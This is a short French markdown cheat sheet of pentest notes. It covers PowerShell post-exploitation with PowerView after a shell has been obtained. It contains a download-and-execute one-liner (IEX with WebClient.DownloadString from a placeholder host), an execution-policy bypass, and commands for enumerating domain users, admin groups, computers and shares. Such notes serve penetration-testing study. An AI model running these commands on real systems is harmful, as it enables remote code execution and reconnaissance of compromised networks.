---
layout: default
---

### PowerShell & PowerView


#### [Retour](../index.md)

### Télécharger un fichier depuis un server web

````powershell 
IEX(New-Object NET.WebClient).DownloadString("http://ip:port/fichier_à_download") | powershell -exec bypass[22:47]
````

#### PowerView
 - Script utilisé pour énumérer un domaine après avoir déjà obtenu un shell dans le système.
 
#### Bypass les droits qui gène l'exécution de scripts :
````powershell
 powershell -ep bypass
 ````
 
#### Lancement de PowerView :
````powershell
. .\Downloads\PowerView.ps1
````

#### Afficher les informations d'un domaine :
````powershell
Get-NetComputer -fulldata | select operatingsystem
````
#### Afficher les utilisateurs du domaine :
````powershell
Get-NetUser | select cn
````
#### Afficher les groupes du domaine (contenant admin) :
````powershell
Get-NetGroup -GroupName *admin*
````

#### Lister les dossiers partagés :
````powershell
Invoke-ShareFinder
````

[Hacktricks-Documentation](https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters/powerview)